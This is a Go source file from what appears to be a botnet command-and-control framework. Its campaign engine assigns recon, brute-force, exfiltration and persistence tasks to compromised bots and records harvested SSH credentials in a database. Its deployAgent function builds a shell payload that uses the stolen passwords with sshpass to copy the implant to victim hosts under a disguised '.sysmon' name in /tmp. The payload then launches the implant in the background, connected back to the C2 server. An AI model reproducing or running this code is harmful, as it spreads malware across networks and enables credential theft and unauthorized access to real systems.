package engine

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"strings"
	"sync"
	"time"

	"github.com/shardc2/shardc2/internal/database"
	"github.com/shardc2/shardc2/pkg/models"
)

type TaskTemplate struct {
	Name    string
	CmdType string
	Payload string
	BotID   string
}

type Engine struct {
	db         *database.DB
	c2URL      string
	implantKey string
	mu         sync.Mutex
}

func New(db *database.DB, c2URL, implantKey string) *Engine {
	return &Engine{db: db, c2URL: c2URL, implantKey: implantKey}
}

func (e *Engine) Start(ctx context.Context) {
	log.Printf("[*] Campaign engine started")
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			log.Printf("[*] Campaign engine stopped")
			return
		case <-ticker.C:
			e.tick(ctx)
		}
	}
}

func (e *Engine) tick(ctx context.Context) {
	e.mu.Lock()
	defer e.mu.Unlock()

	rows, err := e.db.Query(`SELECT id, type, COALESCE(config::text, '{}') FROM campaigns WHERE status = 'running'`)
	if err != nil {
		log.Printf("[-] Engine: failed to query campaigns: %v", err)
		return
	}
	defer rows.Close()

	type camp struct {
		id, cType, config string
	}
	var campaigns []camp
	for rows.Next() {
		var c camp
		if err := rows.Scan(&c.id, &c.cType, &c.config); err != nil {
			continue
		}
		campaigns = append(campaigns, c)
	}
	rows.Close()

	for _, c := range campaigns {
		var taskCount int
		e.db.QueryRow(`SELECT COUNT(*) FROM campaign_tasks WHERE campaign_id = $1`, c.id).Scan(&taskCount)

		if taskCount == 0 {
			e.generateTasks(ctx, c.id, c.cType, c.config)
		}

		e.syncResults(c.id, c.cType)
		e.updateProgress(c.id)
	}
}

func (e *Engine) generateTasks(ctx context.Context, campID, campType, config string) {
	botIDs := e.getAssignedBots(campID)
	if len(botIDs) == 0 {
		log.Printf("[-] Campaign %s: no bots assigned, pausing", campID[:8])
		e.db.Exec(`UPDATE campaigns SET status = 'paused', updated_at = NOW() WHERE id = $1`, campID)
		return
	}

	var tasks []TaskTemplate
	var distributed bool

	switch campType {
	case models.CampaignTypeRecon:
		tasks = ReconTasks(config)
	case models.CampaignTypeBrute:
		var cfg bruteConfig
		json.Unmarshal([]byte(config), &cfg)
		if cfg.Mode == "external" {
			go e.RunExternalBrute(campID, config)
			return
		}
		tasks, distributed = BruteTasks(e.db, config, botIDs)
	case models.CampaignTypeExfil:
		tasks = ExfilTasks(config)
	case models.CampaignTypePersist:
		tasks = PersistTasks(config)
	case models.CampaignTypeCustom:
		tasks = CustomTasks(config)
	default:
		log.Printf("[-] Campaign %s: unknown type %s", campID[:8], campType)
		return
	}

	if len(tasks) == 0 {
		log.Printf("[-] Campaign %s: no tasks generated", campID[:8])
		return
	}

	if distributed {
		for _, task := range tasks {
			e.createTask(campID, task.BotID, task)
		}
	} else {
		for _, botID := range botIDs {
			for _, task := range tasks {
				e.createTask(campID, botID, task)
			}
		}
	}

	var total int
	e.db.QueryRow(`SELECT COUNT(*) FROM campaign_tasks WHERE campaign_id = $1`, campID).Scan(&total)
	e.db.Exec(`UPDATE campaigns SET total_tasks = $1, updated_at = NOW() WHERE id = $2`, total, campID)

	log.Printf("[+] Campaign %s: generated %d tasks for %d bots", campID[:8], total, len(botIDs))
}

func (e *Engine) createTask(campID, botID string, task TaskTemplate) {
	var cmdID string
	err := e.db.QueryRow(`
		INSERT INTO commands (bot_id, type, payload, campaign_id)
		VALUES ($1, $2, $3, $4) RETURNING id`,
		botID, task.CmdType, task.Payload, campID,
	).Scan(&cmdID)
	if err != nil {
		log.Printf("[-] Failed to create command for campaign %s: %v", campID[:8], err)
		return
	}

	_, err = e.db.Exec(`
		INSERT INTO campaign_tasks (campaign_id, bot_id, command_id, task_name)
		VALUES ($1, $2, $3, $4)`,
		campID, botID, cmdID, task.Name,
	)
	if err != nil {
		log.Printf("[-] Failed to create campaign task: %v", err)
	}
}

func (e *Engine) syncResults(campID, campType string) {
	rows, err := e.db.Query(`
		SELECT ct.id, ct.bot_id, ct.command_id, c.status, COALESCE(c.output, '')
		FROM campaign_tasks ct
		JOIN commands c ON c.id = ct.command_id
		WHERE ct.campaign_id = $1 AND ct.status = 'pending'
		AND c.status IN ('completed', 'failed')`, campID)
	if err != nil {
		return
	}
	defer rows.Close()

	type result struct {
		taskID, botID, cmdID, status, output string
	}
	var results []result
	for rows.Next() {
		var r result
		if err := rows.Scan(&r.taskID, &r.botID, &r.cmdID, &r.status, &r.output); err != nil {
			continue
		}
		results = append(results, r)
	}
	rows.Close()

	now := time.Now()
	for _, r := range results {
		e.db.Exec(`UPDATE campaign_tasks SET status = $1, output = $2, completed_at = $3 WHERE id = $4`,
			r.status, r.output, now, r.taskID)

		if campType == models.CampaignTypeBrute && r.status == models.StatusCompleted {
			e.parseBruteResults(campID, r.botID, r.output)
		}
	}
}

func (e *Engine) parseBruteResults(campID, botID, output string) {
	for _, line := range strings.Split(output, "\n") {
		line = strings.TrimSpace(line)
		if !strings.HasPrefix(line, "CRED_FOUND:") {
			continue
		}
		parts := strings.SplitN(line, ":", 5)
		if len(parts) < 5 {
			continue
		}
		username := parts[1]
		password := parts[2]
		target := parts[3]
		port := parts[4]

		e.db.Exec(`
			INSERT INTO credentials (username, password, target, port, service, valid)
			VALUES ($1, $2, $3, $4, 'ssh', true)
			ON CONFLICT DO NOTHING`,
			username, password, target, port)
		log.Printf("[+] Campaign %s: credential found %s@%s:%s", campID[:8], username, target, port)

		e.deployAgent(campID, botID, username, password, target, port)
	}
}

func (e *Engine) deployAgent(campID, botID, user, pass, target, port string) {
	if e.c2URL == "" || e.implantKey == "" {
		log.Printf("[-] Auto-deploy skipped: c2_url or implant_key not configured")
		return
	}

	payload := fmt.Sprintf(`SELF=$(readlink -f /proc/self/exe 2>/dev/null)
if [ -z "$SELF" ] || [ ! -f "$SELF" ]; then echo "DEPLOY_FAILED:cannot_locate_binary"; exit 1; fi
RNAME=".sysmon-$(head -c 4 /dev/urandom | od -A n -t x1 | tr -d ' \n')"
RPATH="/tmp/$RNAME"
if ! command -v sshpass &>/dev/null; then
  apt-get install -y sshpass 2>/dev/null || yum install -y sshpass 2>/dev/null || true
fi
if ! command -v sshpass &>/dev/null; then echo "DEPLOY_FAILED:sshpass_not_available"; exit 1; fi
echo "[*] Deploying agent to %s@%s:%s"
sshpass -p '%s' scp -o StrictHostKeyChecking=no -o ConnectTimeout=10 -P %s "$SELF" '%s@%s':$RPATH 2>&1
if [ $? -ne 0 ]; then echo "DEPLOY_FAILED:scp_error:%s:%s"; exit 1; fi
sshpass -p '%s' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -p %s '%s@%s' "chmod +x $RPATH && nohup $RPATH --server '%s' --implant-key '%s' --interval 10s --jitter 2s >/dev/null 2>&1 & echo AGENT_PID=\$!" 2>&1
echo "DEPLOYED:%s@%s:%s:$RPATH"`,
		user, target, port,
		pass, port, user, target,
		target, port,
		pass, port, user, target,
		e.c2URL, e.implantKey,
		user, target, port,
	)

	task := TaskTemplate{
		Name:    fmt.Sprintf("Auto-Deploy to %s@%s:%s", user, target, port),
		CmdType: "shell",
		Payload: payload,
	}
	e.createTask(campID, botID, task)

	e.db.Exec(`UPDATE campaigns SET total_tasks = total_tasks + 1 WHERE id = $1`, campID)
	log.Printf("[+] Campaign %s: auto-deploy queued for %s@%s:%s via bot %s", campID[:8], user, target, port, botID[:8])
}

func (e *Engine) updateProgress(campID string) {
	var total, completed, failed int
	e.db.QueryRow(`SELECT COUNT(*) FROM campaign_tasks WHERE campaign_id = $1`, campID).Scan(&total)
	e.db.QueryRow(`SELECT COUNT(*) FROM campaign_tasks WHERE campaign_id = $1 AND status = 'completed'`, campID).Scan(&completed)
	e.db.QueryRow(`SELECT COUNT(*) FROM campaign_tasks WHERE campaign_id = $1 AND status = 'failed'`, campID).Scan(&failed)

	e.db.Exec(`UPDATE campaigns SET total_tasks = $1, completed_tasks = $2, failed_tasks = $3, updated_at = NOW() WHERE id = $4`,
		total, completed, failed, campID)

	if total > 0 && (completed+failed) >= total {
		status := models.CampaignStatusCompleted
		if failed > completed {
			status = models.CampaignStatusFailed
		}
		e.db.Exec(`UPDATE campaigns SET status = $1, updated_at = NOW() WHERE id = $2`, status, campID)
		log.Printf("[+] Campaign %s: finished (%d completed, %d failed)", campID[:8], completed, failed)
	}
}

func (e *Engine) getAssignedBots(campID string) []string {
	rows, err := e.db.Query(`
		SELECT cb.bot_id FROM campaign_bots cb
		JOIN bots b ON b.id = cb.bot_id
		WHERE cb.campaign_id = $1 AND b.status = 'active'
		AND b.last_seen > NOW() - INTERVAL '5 minutes'`, campID)
	if err != nil {
		return nil
	}
	defer rows.Close()

	var ids []string
	for rows.Next() {
		var id string
		if err := rows.Scan(&id); err != nil {
			continue
		}
		ids = append(ids, id)
	}
	return ids
}

func parseJSON(raw string, v interface{}) {
	json.Unmarshal([]byte(raw), v)
}
